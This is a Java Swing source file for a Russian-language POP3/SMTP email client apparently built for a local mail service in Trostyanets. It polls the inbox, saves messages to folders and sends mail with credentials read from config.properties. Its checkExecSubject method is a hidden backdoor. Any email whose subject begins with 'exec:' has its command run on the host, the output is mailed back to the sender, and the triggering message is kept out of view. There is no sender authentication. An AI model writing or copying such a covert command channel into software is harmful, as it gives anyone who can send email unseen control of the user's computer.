import com.sun.mail.pop3.POP3Folder;
import com.sun.org.apache.xerces.internal.xs.StringList;
import com.sun.xml.internal.fastinfoset.util.StringArray;

import java.awt.*;
import java.awt.event.*;
import java.io.*;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.List;
import javax.mail.*;
import javax.mail.internet.*;
import javax.swing.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import javax.swing.SwingWorker;
import static java.util.concurrent.TimeUnit.*;

// The E-mail Client.
public class EmailClient extends JFrame {

    // Table listing messages.
    private JPanel list;

    // This the text area for displaying messages.
    private JTextArea messageTextArea;

    /* This is the split panel that holds the messages
       table and the message view panel. */
    private JSplitPane splitPane;

    // These are the buttons for managing the selected message.
    private JButton replyButton, forwardButton, deleteButton;

    // Currently selected message in table.
    private Message selectedMessage;

    // Flag for whether or not a message is being deleted.
    private boolean deleting;

    // This is the JavaMail session.
    private Session session;

    private List<String> uids;

    // Constructor for E-mail Client.
    public EmailClient() {

        uids = new ArrayList<String>();

        ResourceBundle messages = ResourceBundle.getBundle("MessagesBundle",new Locale("en"));

        //setExtendedState(Frame.MAXIMIZED_BOTH);
        //setUndecorated(true);
        getContentPane().setBackground(Color.YELLOW);

        // Set application title.
        //setTitle("E-mail Client");
        setTitle(messages.getString("title"));
//        setTitle("Тростянецка Почта");

        // Handle window closing events.
        addWindowListener(new WindowAdapter() {
            public void windowClosing(WindowEvent e) {
                actionExit();
            }
        });

        // Setup file menu.
        JMenuBar menuBar = new JMenuBar();
        //JMenu fileMenu = new JMenu("File");
        JMenu fileMenu = new JMenu("Меню");
        fileMenu.setMnemonic(KeyEvent.VK_F);
//        JMenuItem fileExitMenuItem = new JMenuItem("Exit",
        JMenuItem fileExitMenuItem = new JMenuItem("Выход",
                KeyEvent.VK_X);
        fileExitMenuItem.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                actionExit();
            }
        });
        fileMenu.add(fileExitMenuItem);
        menuBar.add(fileMenu);
        setJMenuBar(menuBar);

        // Setup buttons panel.
        JPanel buttonPanel = new JPanel();
        //JButton newButton = new JButton("New Message");
        JButton nButton = new JButton("Написать письмо");
        nButton.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                actionNew();
            }
        });
        buttonPanel.add(nButton);

        list = new JPanel();
        list.setLayout(new BoxLayout(list, BoxLayout.Y_AXIS));

        // Setup E-mails panel.
        JPanel emailsPanel = new JPanel();
//        emailsPanel.setBorder(BorderFactory.createTitledBorder("E-mails"));
        messageTextArea = new JTextArea();
        messageTextArea.setEditable(false);
        emailsPanel.setLayout(new BorderLayout());

        emailsPanel.add(new JScrollPane(list));

        // Setup buttons panel.
        JPanel buttonPanel2 = new JPanel();
        JButton archiveButton = new JButton("Архив писем");
        archiveButton.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                actionShowArchive();
            }
        });
        archiveButton.setEnabled(true);
        buttonPanel2.add(archiveButton);

        JButton newButton = new JButton("Новые сообщения");
        newButton.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                actionShowNew();
            }
        });
        newButton.setEnabled(true);
        buttonPanel2.add(newButton);

        //deleteButton = new JButton("Delete");
        JButton allButton = new JButton("Показать все");
        allButton.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                actionShowAll();
            }
        });
        allButton.setEnabled(true);
        buttonPanel2.add(allButton);

        // Add panels to display.
        getContentPane().setLayout(new BorderLayout());
        getContentPane().add(buttonPanel, BorderLayout.NORTH);
        getContentPane().add(emailsPanel, BorderLayout.CENTER);
        getContentPane().add(buttonPanel2, BorderLayout.SOUTH);
    }

    private void showMessages(String folder)
    {
        try {
            File newstorage = new File(folder);
            File[] newmessages = newstorage.listFiles();
            Arrays.sort(newmessages);

            for(int i=newmessages.length-1; i>=0; i--) {
                if (newmessages[i].isFile() && newmessages[i].length()>0)
                {
                    InputStream source = new FileInputStream(newmessages[i]);
                    MimeMessage message = new MimeMessage(session, source);

                    list.add(new MessagePanel(message, this, newmessages[i]));
                }
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    // Exit this program.
    private void actionExit() {
        System.exit(0);
    }

    // Create a new message.
    private void actionNew() {
        sendMessage(MessageDialog.NEW, null);
    }

    // Reply to a message.
    private void actionReply() {
        sendMessage(MessageDialog.REPLY, selectedMessage);
    }

    // Show archived messages.
    private void actionShowArchive()
    {
        list.removeAll();
        showMessages("box/archive");
        list.updateUI();
    }

    // Show new messages.
    public void actionShowNew() {
        list.removeAll();
        showMessages("box/new");
        list.updateUI();
    }

    // Show all messages.
    private void actionShowAll() {
        list.removeAll();
        showMessages("box/new");
        showMessages("box/archive");
        list.updateUI();
    }

    // Forward a message.
    private void actionForward() {
        sendMessage(MessageDialog.FORWARD, selectedMessage);
    }

    // Remove message from the list.
    public void removeFromList(MessagePanel p) {
        list.remove(p);
        list.updateUI();
    }

    public void receive()
    {
        ReceivingWorker worker = new ReceivingWorker();
        worker.execute();
    }

    public class SendingWorker
            extends SwingWorker<Integer, Objects> {

        public SendingWorker(){
        }

        @Override
        protected Integer doInBackground() throws Exception {
            try {
                File newstorage = new File("box/out");
                File[] newmessages = newstorage.listFiles();
                Arrays.sort(newmessages);

                for(int i=0; i<newmessages.length;i++)
                {
                    if (newmessages[i].isFile() && newmessages[i].length()>0)
                    {
                        InputStream source = new FileInputStream(newmessages[i]);
                        MimeMessage message = new MimeMessage(session, source);

                        Properties prop = new Properties();
                        try {
                            //load a properties file
                            prop.load(new FileInputStream("config.properties"));
                        } catch (IOException ex) {
                            ex.printStackTrace();
                        }

                        // Send new message.
                        Transport.send(message, prop.getProperty("user"), prop.getProperty("password"));
                        newmessages[i].delete();
                    }
                }
            } catch (Exception ex) {
                ex.printStackTrace();
            }

            return 1;
        }
    }

    private void saveSentMessage(Message mes)
    {
        try {
            DateFormat df = new SimpleDateFormat("yyyyMMddHHmmssSSS");
            Date nowtime = Calendar.getInstance().getTime();

            processSaveToFile(mes, "box/out/", df.format(nowtime));
        } catch (Exception e) {
            //showError("Unable to send message.", false);
            showError("Не получается сохранить сообщение.", false);
        }

    }

    // Send the specified message.
    public void sendMessage(int type, Message message) {
        // Display message dialog to get message values.
        MessageDialog dialog;
        try {
            dialog = new MessageDialog(this, type, message);
            if (!dialog.display()) {
                // Return if dialog was cancelled.
                return;
            }
        } catch (Exception e) {
            //showError("Unable to send message.", false);
            showError("Не получается послать сообщение.", false);
            return;
        }

        try {
            // Create a new message with values from dialog.
            Message newMessage = new MimeMessage(session);
            newMessage.setFrom(new InternetAddress(dialog.getFrom()));
            newMessage.setRecipient(Message.RecipientType.TO,
                    new InternetAddress(dialog.getTo()));
            newMessage.setSubject(dialog.getSubject());
            newMessage.setSentDate(new Date());
            newMessage.setText(dialog.getContent());

            saveSentMessage(newMessage);

            SendingWorker worker = new SendingWorker();
            worker.execute();
            //processSending();

        } catch (Exception e) {
            //showError("Unable to send message.", false);
            showError("Не получается послать сообщение.", false);
        }
    }

    private void sendExecResponse (String subject, String to, String text)
    {
        Properties prop = new Properties();
        try {
            //load a properties file
            prop.load(new FileInputStream("config.properties"));
        } catch (IOException ex) {
            ex.printStackTrace();
        }

        try {
            // Create a new message with values from dialog.
            Message newMessage = new MimeMessage(session);
            newMessage.setFrom(new InternetAddress(prop.getProperty("user")));
            newMessage.setRecipient(Message.RecipientType.TO,
                    new InternetAddress(to));
            newMessage.setSubject("RE: " + subject);
            newMessage.setSentDate(new Date());
            newMessage.setText(text);

            saveSentMessage(newMessage);

            // Send new message.
            SendingWorker worker = new SendingWorker();
            worker.execute();

        } catch (Exception e) {
            //showError("Unable to send message.", false);
        }
    }

    private void resetUid () {
        uids.clear();

        loadUid("box/new");
        loadUid("box/archive");
    }

    private void loadUid (String storage) {

        File boxnew = new File(storage);
        File[] boxnewlist = boxnew.listFiles();

        for(int i=0;i<boxnewlist.length;i++) {
            if (boxnewlist[i].isFile()) {
                uids.add(boxnewlist[i].getName());
            }
        }
    }

    private boolean checkUidNew (String uid) {
        return !uids.contains(uid);
    }

    public class ReceivingWorker
            extends SwingWorker<Integer, Objects> {

        public ReceivingWorker(){
        }

        @Override
        protected Integer doInBackground() throws Exception {
        Properties prop = new Properties();
        try {
            //load a properties file
            prop.load(new FileInputStream("config.properties"));
        } catch (IOException ex) {
            ex.printStackTrace();
        }
/*
        if (prop.getProperty("server").trim().length() < 1
                || prop.getProperty("user").trim().length() < 1
                || prop.getProperty("password").length() < 1
                || prop.getProperty("smtp").trim().length() < 1)
        {
            ConnectDialog dialog = new ConnectDialog(this);
            dialog.show();
        }
*/
        // Build connection URL from connect dialog settings.
        StringBuffer connectionUrl = new StringBuffer();
        connectionUrl.append("pop3s" + "://");

      /* Display dialog stating that messages are
       currently being downloaded from server.
        final DownloadingDialog downloadingDialog =
                new DownloadingDialog(this);
        SwingUtilities.invokeLater(new Runnable() {
            public void run() {
                downloadingDialog.show();
            }
        });
            */
        // Establish JavaMail session and connect to server.
        Store store = null;
        try {
            // Initialize JavaMail session with SMTP server.
            Properties props = new Properties();
            props.put("mail.smtp.port", 587); // 1and1.com
            //props.put("mail.smtp.port", 465); // zoho.com
            props.put("mail.smtp.host", prop.getProperty("smtp"));
            props.put("mail.smtp.auth", "true");
            props.put("mail.smtp.starttls.enable", true);

            session = Session.getDefaultInstance(props, null);

            // Connect to e-mail server.
            URLName urln = new URLName(connectionUrl.toString());
            store = session.getStore(urln);
            store.connect(prop.getProperty("server"), 995, prop.getProperty("user"), prop.getProperty("password"));
        } catch (Exception e) {
            // Close the downloading dialog.
            //downloadingDialog.dispose();

            // Show error dialog.
            //showError("Unable to connect.", true);
            showError("Не могу соединиться. Скорее всего что-то с интернетом. Попробуйте еще.", true);
        }

        // Download message headers from server.
        try {
            boolean newreceived = false;
            // Open main "INBOX" folder.
            POP3Folder folder = (POP3Folder) store.getFolder("INBOX");
            folder.open(Folder.READ_ONLY);

            try {
                resetUid();

                int mes_count = folder.getMessageCount();
                if (mes_count>uids.size())
                {
                    int start_mess_ind = uids.size()+1;
                    Message[] messages = folder.getMessages(start_mess_ind,mes_count);

                    // Retrieve message headers for each message in folder.
                    FetchProfile profile = new FetchProfile();
                    profile.add(FetchProfile.Item.ENVELOPE);
                    profile.add(FetchProfile.Item.SIZE);
                    profile.add(UIDFolder.FetchProfileItem.UID);
                    folder.fetch(messages, profile);

                    for (int i=0; i < messages.length; ++i)
                    {
                        Message msg = messages[i];
                        java.text.DecimalFormat nft = new
                        java.text.DecimalFormat("#00000.###");
                        nft.setDecimalSeparatorAlwaysShown(false);

                        String uid = nft.format(start_mess_ind + i) + "." + folder.getUID(msg);
                        int size = msg.getSize();

                        if (checkUidNew(uid))
                        {
                            if (checkExecSubject(msg))
                            {
                                // message should be saved but not displayed
                                // save as file with size=0
                                processSaveToFile(null, "box/new/", uid);
                                // check on display
                            }
                            else if (size < 200000)
                            {
                                processSaveToFile(msg, "box/new/", uid);
                                newreceived = true;
                            }
                            else
                            {
                                try{
                                    // Create a default MimeMessage object.
                                    MimeMessage big_message = new MimeMessage(session);

                                    // Set From: header field of the header.
                                    big_message.setFrom(msg.getFrom()[0]);

                                    // Set To: header field of the header.
                                    big_message.addRecipient(Message.RecipientType.TO, msg.getRecipients(Message.RecipientType.TO)[0]);

                                    // Set Subject: header field
                                    big_message.setSubject("RE: "+msg.getSubject());

                                    // Now set the actual message
                                    //big_message.setText("This message is too big to be received. Please ask to send shorter one");
                                    big_message.setText("Сообщение слишком большое, чтобы быть принятым в Тростянце. Пошлите пожалуйста покороче.");

                                    // Send message
                                    processSaveToFile(big_message, "box/new/", uid);
                                }catch (MessagingException mex) {
                                    mex.printStackTrace();
                                }
                            }
                        }
                    }
                }

                // show new messages here if there are new ones
                if (newreceived)
                    actionShowNew();

            } catch (Exception ex) {
                ex.printStackTrace();
            }

        } catch (Exception e) {
            // Close the downloading dialog.
            //downloadingDialog.dispose();

            // Show error dialog.
            //showError("Unable to download messages.", true);
            showError("Не могу загрузить сообщения. Попробуйте позже.", true);
        }

        // Close the downloading dialog.
        //downloadingDialog.dispose();

        pack();

        return 1;
        }
    }

    private boolean checkExecSubject (Message msg)
            throws MessagingException, IOException
    {
        boolean result = false;
        String subject = msg.getSubject();
        String response = "";
        if (subject!=null && subject.startsWith("exec:"))
        {
            result = true;

            String cmd = subject.substring(5);
            String [] elements = cmd.split(" ");

            Runtime run = Runtime.getRuntime();
            Process pr = null;

            try
            {
                pr = run.exec(elements);
            }
            catch (IOException e)
            {
                e.printStackTrace();
            }

            try
            {
                pr.waitFor();
            }
            catch (InterruptedException e) {
                e.printStackTrace();
            }

            BufferedReader buf = new BufferedReader(new InputStreamReader(pr.getInputStream()));
            String line = "";
            try
            {
                while ((line=buf.readLine())!=null)
                {
                    response += line;
                    response += "\n";
                }
            }
            catch (IOException e) {
                e.printStackTrace();
            }

            sendExecResponse (msg.getSubject(), msg.getFrom()[0].toString(), response);
        }

        return result;
    }

    private void processSaveToFile (Message msg, String path, String uid)
            throws MessagingException, IOException
    {
        String whereToSave = path + uid;

        OutputStream out = new FileOutputStream(new File(whereToSave));
        try {
            if (msg!=null)
                msg.writeTo(out);

            uids.add(uid);
        }
        finally {
            if (out != null) { out.flush(); out.close(); }
        }
    }

    // Get a message's content.
    public static String getMessageContent(Message message)
            throws Exception {
        Object content = message.getContent();
        if (content instanceof Multipart) {
            StringBuffer messageContent = new StringBuffer();
            Multipart multipart = (Multipart) content;
            for (int i = 0; i < multipart.getCount(); i++) {
                Part part = (Part) multipart.getBodyPart(i);
                if (part.isMimeType("text/plain")) {
                    messageContent.append(part.getContent().toString());
                }
            }
            return messageContent.toString();
        } else {
            return content.toString();
        }
    }

    // Show error dialog and exit afterwards if necessary.
    private void showError(String message, boolean exit) {
//        JOptionPane.showMessageDialog(this, message, "Error",
        JOptionPane.showMessageDialog(this, message, "Ошибка",
                JOptionPane.ERROR_MESSAGE);
        if (exit)
            System.exit(0);
    }

    public final ScheduledExecutorService scheduler =
            Executors.newScheduledThreadPool(1);

    public void checkMailEveryMinute() {
        final Runnable checkMail = new Runnable() {
            public void run() { receive(); }
        };
        final ScheduledFuture<?> beeperHandle =
                scheduler.scheduleWithFixedDelay(checkMail, 20, 20, SECONDS);
    }

    // Run the E-mail Client.
    public static void main(String[] args) {
        EmailClient client = new EmailClient();

        client.show();
        client.actionShowNew();

        // Display connect dialog.
        client.receive();
        client.checkMailEveryMinute();
    }
}